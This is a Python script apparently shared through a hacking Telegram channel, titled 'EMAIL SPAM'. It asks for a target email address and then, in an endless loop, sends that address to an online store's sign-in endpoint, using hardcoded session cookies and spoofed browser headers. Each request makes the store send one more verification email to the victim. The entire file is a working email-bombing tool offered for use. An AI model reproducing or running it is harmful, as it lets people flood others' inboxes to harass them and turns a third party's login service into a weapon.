from builtins import exec,format,input,len,print,int,range,str,open
exec("")
import requests,user_agent,time
from fake_useragent import UserAgent
user=user_agent.generate_user_agent()
import sys,time,os

os.system("clear")
from cfonts import render
output=render("EMAIL SPAM",colors=["blue","white"],align="center")
print(output)
print(" ⿻ TOOL BY : @ANONYMOUS_PK | TELEGRAM CHANNEL : @HACKINGTOOLX | VERSION : 1.0 ")

print("\n")
email=input("[+] ENTER TARGET EMAIL : ")

print("\n")
while True:
	cook={
	    "nguestv2":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJraWQiOiJiYjlhZTUyOTY1ZTI0NGIxODFkY2IwNTYxNWY4ZmI3NCIsImlhdCI6MTcxNzcyMjk4OCwiZXhwIjoxNzE3NzIzMjg4fQ.h_0c90DgVMG6qOOs2wgk3I0qNSC_J4T9d8lNs5erIJM",
	    "AKA_A2":"A",
	    "x-whoami-headers":"eyJ4LWxhdCI6IjI1MTk5ODQ5NSIsIngtbG5nIjoiNTUyNzE1OTg1IiwieC1lY29tLXpvbmVjb2RlIjoiQUVfRFhCLVM1IiwieC1yb2NrZXQtem9uZWNvZGUiOiJXMDAwNjc1MjZBIiwieC1yb2NrZXQtZW5hYmxlZCI6dHJ1ZSwieC1ib3JkZXItZW5hYmxlZCI6dHJ1ZX0=",
	    "bm_mi":"1CD8174D02AE5A50B262728AE9E0E4C3~YAAQijwSAvJzg8uPAQAAWPZE8Bj17+favukAOK7GdmCNR8U9vX4gPCetN8b4HklWqiq9fK62w+3MNIneWLIvZ2mHsenhlmjazitEuTtuLbbN8L5UYNZRAO5JIdjrb0ZRg56idOlEasqI6djCate0VYpF9nfuSPyUIl+ZMmunJNqkfNTVo4ZcbWObAWQL9wtgJMmoynRRaCDuMH9IkEUfshgKTrePTt6StP+OEFIrezjceJHPFqE1uiOqd+4i0IHj+Xl5fkkuRY6UadIXZUf3bKM4qUUOIoCyFrATD+oJ7ecw7XRbddI+fkbwkTw3iuJJOWSc~1",
	    "nloc":"en-ae",
	    "visitor_id":"40fabe5a-cb76-4bc8-b1cc-aaa722182968",
	    "ak_bmsc":"02CBEE6848564A658389184606E57D84~000000000000000000000000000000~YAAQijwSAjl1g8uPAQAAkjVF8BispnPW5/pwG29bSP3Zvz+WlcZYB+TkIxwNvEo02zzqNnJCRKPpMo+QZuwqhB6BzkUlzM35ZqRZQwyxcucYcam0Fs1/G6Y1HqN4qK7Dmd0+ukeVfTR59WQUkcyMyQyHd0Tj8dr77EXzMyAJvFCNU9ZrqsHpT4YZG+a2rOQ/X8oevVs63QOOeNKEuYuLeiy4GTWo+xfSljfGqqIgztKttq84Lw6PeLJSpzEa+Yo8aWDkH+TsnPk+gCDDNjidfERp7PdmybX4mHC5vAU7vzCX9wrMnn2srnzzWebXTOiHv4RUiApODSMXw/KyRbmicvGWGCqjpSQIBXbephwYsjrchmYMJv2iPbzG8i5Wyckwkpvx+w63t1im4noTfPHSiUKfJi3N+nv9gR93+EEKRiXF+uEKBTmVYHZgKokTeoGlf91Mafx30WDKXGNeTHblxClRfT3NqqziMpAMUjAdazJ7B3KH",
	    "_gcl_au":"1.1.1992363311.1717723019",
	    "_ga":"GA1.2.932447586.1717723020",
	    "_gid":"GA1.2.810733352.1717723020",
	    "_gat_UA-84507530-14":"1",
	    "__rtbh.lid":"%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22yZCD1xLaXpFvErYKCVC3%22%7D",
	    "_scid":"51cf5267-1860-4412-a9ee-69cca52bc338",
	    "_ym_uid":"1717723022853387442",
	    "_ym_d":"1717723022",
	    "__rtbh.uid":"%7B%22eventType%22%3A%22uid%22%2C%22id%22%3Anull%7D",
	    "_tt_enable_cookie":"1",
	    "_ttp":"eP_6oJDUnwP5aTfWPvvgYfBMamm",
	    "_fbp":"fb.1.1717723023787.678290488319042795",
	    "_sctr":"1%7C1717714800000",
	    "RT":"\"z=1&dm=noon.com&si=bw8gq63ca3&ss=lx3zxavh&sl=1&tt=0&obo=1&rl=1\"",
	    "_etc":"f3nlrSXbBAIWGvfp",
	    "_uetsid":"a47bb480246b11ef8ad0c31f1a857522",
	    "_uetvid":"a47d7320246b11ef8c8033c7bbfedb6d",
	    "_scid_r":"51cf5267-1860-4412-a9ee-69cca52bc338",
	    "_clck":"1tjktpt%7C2%7Cfmf%7C0%7C1619",
	    "_clsk":"1wiqxif%7C1717723042344%7C1%7C0%7Cq.clarity.ms%2Fcollect",
	    "bm_sv":"BC246EF83CCC8C1863EDB9526820B60D~YAAQijwSApB3g8uPAQAAErhF8BgEbPmDwM5UOcuufSdZl8yvjazUun32jfvzBjx2/1VNXGyUiw42yCwLdoM/A+kkaCUjvErTw7f16M3i7DpogpmHkwxesEbGz9fYWzDTLXeK/ZzqEICnOdsGFVUta56T0QCY8ZEI8YCSgEZcq1ZbuF3kIfbJqfvQmfRrDd1tF8YkmYuBvA8Rfy0sr5D7aFZBShlOrR7RX0k6xUuhHmY3O3Fm6tOpZvPUojFUYe0=~1",
	    "th_capi_em":"484e3a089b6e7a33a6703901195669e555a1a584308fdc0ac99af90c43c427c0",
	}
	head={
	    "authority":"www.noon.com",
	    "accept":"application/json, text/plain, */*",
	    "accept-language":"en-US,en;q=0.9,ar-DZ;q=0.8,ar;q=0.7",
	    "cache-control":"no-cache, max-age=0, must-revalidate, no-store",
	    "content-type":"application/json",
	    "origin":"https://www.noon.com",
	    "referer":"https://www.noon.com/uae-en/account_mobile/",
	    "sec-ch-ua":"\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
	    "sec-ch-ua-mobile":"?1",
	    "sec-ch-ua-platform":"\"Android\"",
	    "sec-fetch-dest":"empty",
	    "sec-fetch-mode":"cors",
	    "sec-fetch-site":"same-origin",
	    "user-agent":user,
	    "x-ab-test":"561,641,731,830,851,861,881",
	    "x-aby":"{\"ipl_v2.enabled\":1,\"pdp_bos.enabled\":1,\"otp_login.enabled\":1,\"pp_entrypoint.enabled\":1,\"pdp_flyout.flyout_value\":0}",
	    "x-border-enabled":"true",
	    "x-cms":"v2",
	    "x-content":"mobile",
	    "x-ecom-zonecode":"AE_DXB-S5",
	    "x-lat":"251998495",
	    "x-lng":"552715985",
	    "x-locale":"en-ae",
	    "x-mp":"noon",
	    "x-platform":"web",
	    "x-rocket-enabled":"true",
	    "x-rocket-zonecode":"W00067526A",
	    "x-visitor-id":"40fabe5a-cb76-4bc8-b1cc-aaa722182968",
	}
	json_data={
	    "emailOrPhone":email,
	}
	resp=requests.post(
	    "https://www.noon.com/_svc/mp-identity-api/auth/sign-in",
	    cookies=cook,
	    headers=head,
	    json=json_data,
	)
	if "\"verifyMethodMsg\":\"Verify your email\"" in resp.text:
		print(" SUCCESS ⚡ | Email Sent !! "+email)
		print("\n")
		time.sleep(1)
	else:
		print(" FAILED | Email Not Sent !! "+email)
